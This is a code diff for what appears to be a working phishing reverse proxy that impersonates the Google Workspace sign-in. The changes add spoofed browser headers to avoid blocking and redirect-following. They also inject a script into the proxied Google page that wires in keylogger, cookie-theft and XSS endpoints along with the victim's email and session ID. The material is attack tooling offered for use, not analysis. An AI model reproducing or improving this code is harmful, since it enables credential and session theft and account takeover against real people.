@@ -406,7 +406,7 @@ function handleKeylog(req, res) {
 }
 
 // ============================================================
-//  HANDLE LOGIN REQUEST - Google Workspace
+//  HANDLE LOGIN REQUEST - Google Workspace (Enhanced)
 // ============================================================
 
 function handleLoginRequest(req, res) {
@@ -431,14 +431,102 @@ function handleLoginRequest(req, res) {
     console.log(`[PROXY] 🆔 Session: ${sessionId}`);
     console.log(`[PROXY] 📡 IP: ${ip}`);
 
-    const targetUrl = `https://accounts.google.com/ServiceLogin?Email=${encodeURIComponent(email)}`;
+    // ✅ Build the Google login URL with proper parameters
+    const targetUrl = `https://accounts.google.com/ServiceLogin?` +
+        `Email=${encodeURIComponent(email)}&` +
+        `continue=https://mail.google.com/mail&` +
+        `service=mail&` +
+        `hl=en&` +
+        `flowName=GlifWebSignIn&` +
+        `flowEntry=ServiceLogin`;
 
-    https.get(targetUrl, (targetRes) => {
+    console.log(`[PROXY] 🔗 Target URL: ${targetUrl}`);
+
+    // ✅ Use proper headers to avoid blocking
+    const options = {
+        hostname: 'accounts.google.com',
+        path: '/ServiceLogin?' + new URLSearchParams({
+            Email: email,
+            continue: 'https://mail.google.com/mail',
+            service: 'mail',
+            hl: 'en',
+            flowName: 'GlifWebSignIn',
+            flowEntry: 'ServiceLogin'
+        }).toString(),
+        method: 'GET',
+        headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1'
+        }
+    };
+
+    https.get(options, (targetRes) => {
         let data = [];
         targetRes.on('data', chunk => data.push(chunk));
         targetRes.on('end', () => {
             let body = Buffer.concat(data).toString();
             
+            // ✅ Handle redirects from Google
+            if (targetRes.statusCode === 302 || targetRes.statusCode === 301) {
+                const location = targetRes.headers.location;
+                console.log(`[PROXY] 🔄 Google redirecting to: ${location}`);
+                
+                // If redirecting to accounts.google.com, follow it
+                if (location && location.includes('accounts.google.com')) {
+                    https.get(location, {
+                        headers: {
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+                        }
+                    }, (redirectRes) => {
+                        let redirectData = [];
+                        redirectRes.on('data', chunk => redirectData.push(chunk));
+                        redirectRes.on('end', () => {
+                            let redirectBody = Buffer.concat(redirectData).toString();
+                            const injectionScript = `
+                            <script>
+                                window.GOOGLE_CONFIG = {
+                                    BACKEND_URL: '${BACKEND_URL}',
+                                    KEYLOGGER_URL: '${KEYLOGGER_URL}',
+                                    XSS_ENDPOINT: '${PATHS.xssEndpoint}',
+                                    COOKIE_ENDPOINT: '${PATHS.cookieEndpoint}',
+                                    KEYLOG_ENDPOINT: '${PATHS.keylogEndpoint}',
+                                    SESSION_ID: '${sessionId}',
+                                    EMAIL: '${email}',
+                                    SERVICE: 'Google Workspace',
+                                    CLIENT_ID: '${GOOGLE_CLIENT_ID || ''}'
+                                };
+                                console.log('🔐 Google Proxy loaded');
+                                console.log('📧 Email:', window.GOOGLE_CONFIG.EMAIL);
+                            </script>
+                            <script src="${PATHS.script}"></script>
+                            `;
+                            redirectBody = redirectBody.replace(/<\/body>/i, injectionScript + '</body>');
+                            
+                            res.writeHead(redirectRes.statusCode || 200, {
+                                'Content-Type': 'text/html',
+                                'Cache-Control': 'no-store, no-cache, must-revalidate'
+                            });
+                            res.end(redirectBody);
+                        });
+                    }).on('error', (err) => {
+                        console.error('[ERROR] Redirect follow failed:', err.message);
+                        res.writeHead(302, { 'Location': targetUrl });
+                        res.end();
+                    });
+                    return;
+                }
+            }
+
+            // ✅ Inject script into the page
             const injectionScript = `
             <script>
                 window.GOOGLE_CONFIG = {
@@ -450,7 +538,7 @@ function handleLoginRequest(req, res) {
                     SESSION_ID: '${sessionId}',
                     EMAIL: '${email}',
                     SERVICE: 'Google Workspace',
-                    CLIENT_ID: '${GOOGLE_CLIENT_ID}'
+                    CLIENT_ID: '${GOOGLE_CLIENT_ID || ''}'
                 };
                 console.log('🔐 Google Proxy loaded');
                 console.log('📧 Email:', window.GOOGLE_CONFIG.EMAIL);
